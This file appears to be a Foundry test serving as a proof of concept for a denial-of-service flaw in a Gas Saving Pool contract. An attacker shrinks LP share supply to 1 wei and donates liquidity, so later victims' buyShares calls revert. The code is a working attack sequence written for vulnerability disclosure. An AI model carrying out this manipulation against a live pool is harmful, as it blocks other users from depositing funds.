// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import "../../contracts/GasSavingPool/impl/GSP.sol";

/**
 * @title ExploitTest
 * @notice Proof-of-Concept demonstrating DoS in GSPFunding.buyShares() that becomes
 *         un-usable after a malicious first LP manipulates totalSupply down to 1 wei.
 *
 * The vulnerability: during first deposit, shares are minted equal to the smaller
 * of baseBalance and quoteBalance / I.  Because the contract enforces a minimum
 * mint amount of > 1000 **only** in the internal _mint() function, an attacker can:
 *
 * 1. Provide a tiny initial liquidity of 1,001 wei base & quote, receiving 1,001 wei
 *    GLP shares (>1000 so passes the check).
 * 2. Immediately sell 1,000 shares, leaving totalSupply == 1 wei.
 * 3. From now on, buyShares() calculates `shares = totalSupply * mintRatio / 1e18`.
 *    With totalSupply = 1, the result is < 1000 for any realistic mintRatio, so the
 *    subsequent _mint() call reverts with "MINT_AMOUNT_NOT_ENOUGH" causing a DoS
 *    for all other users.
 *
 * This test walks through the attack and asserts that a normal user can no longer
 * call buyShares after the manipulation.
 */
contract ExploitTest is Test {
    MockERC20 internal base;
    MockERC20 internal quote;

    GSP internal gsp;

    address internal attacker = address(0xA11CE);
    address internal victim   = address(0xB0B);

    // Useful constants -------------------------------------------------------
    uint256 internal constant ONE = 1e18; // 18-decimals helper

    // ------------------------------------------------------------------------
    function setUp() public {
        // Deploy mock tokens
        base  = new MockERC20("BaseToken", "BASE", 18);
        quote = new MockERC20("QuoteToken", "QUOTE", 18);

        // Mint plenty of tokens to attacker and victim
        base.mint(attacker, 1_000_000 * ONE);
        quote.mint(attacker, 1_000_000 * ONE);
        base.mint(victim, 1_000_000 * ONE);
        quote.mint(victim, 1_000_000 * ONE);

        // Deploy and initialize GSP pool
        gsp = new GSP();
        gsp.init(
            address(this),         // maintainer (irrelevant for test)
            address(base),
            address(quote),
            0,                      // lpFeeRate
            0,                      // mtFeeRate
            1e18,                   // I (oracle price) == 1
            0,                      // K (curve param)
            false                   // TWAP disabled
        );

        // Approvals so the pool can pull tokens during sells
        vm.startPrank(attacker);
        base.approve(address(gsp), type(uint256).max);
        quote.approve(address(gsp), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        base.approve(address(gsp), type(uint256).max);
        quote.approve(address(gsp), type(uint256).max);
        vm.stopPrank();
    }

    /**
     * @dev Executes the attack described in the vulnerability annotation.
     */
    function testDenialOfServiceAfterSupplyManipulation() public {
        //----------------------------------
        // 1. Attacker Seeds the Pool
        //----------------------------------
        uint256 seedAmount = 1_001; // in wei (INTENTIONALLY TINY!)

        vm.startPrank(attacker);
        // Transfer tiny liquidity to pool – buyShares expects balances to already be there
        base.transfer(address(gsp), seedAmount);
        quote.transfer(address(gsp), seedAmount);

        (uint256 minted,,) = gsp.buyShares(attacker);
        assertEq(minted, seedAmount, "attacker should receive 1,001 tiny shares");
        vm.stopPrank();

        //----------------------------------
        // 2. Attacker burns 1,000 shares → totalSupply becomes 1 wei
        //----------------------------------
        vm.prank(attacker);
        gsp.sellShares(
            1_000,                 // shareAmount
            attacker,             // to
            0,                    // baseMinAmount
            0,                    // quoteMinAmount
            "",                   // data
            block.timestamp + 1   // deadline
        );

        // Sanity-check: supply == 1
        assertEq(gsp.totalSupply(), 1, "totalSupply should be 1 wei after burn");

        //----------------------------------
        // 3. Attacker donates huge liquidity and syncs reserves
        //----------------------------------
        uint256 donation = 1_000 * ONE; // 1,000 tokens with 18 decimals
        vm.startPrank(attacker);
        base.transfer(address(gsp), donation);
        quote.transfer(address(gsp), donation);
        gsp.sync(); // update reserves to include donation
        vm.stopPrank();

        //----------------------------------
        // 4. Victim tries to mint normally → should revert
        //----------------------------------
        uint256 victimDeposit = ONE; // victim deposits just 1 token of each asset

        vm.startPrank(victim);
        base.transfer(address(gsp), victimDeposit);
        quote.transfer(address(gsp), victimDeposit);

        vm.expectRevert(bytes("MINT_AMOUNT_NOT_ENOUGH"));
        gsp.buyShares(victim);
        vm.stopPrank();
    }
}

/**
 * @dev Simple ERC20 with unrestricted mint for testing purposes.
 */
contract MockERC20 is ERC20 {
    uint8 private immutable _decimals;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_) {
        _decimals = decimals_;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}
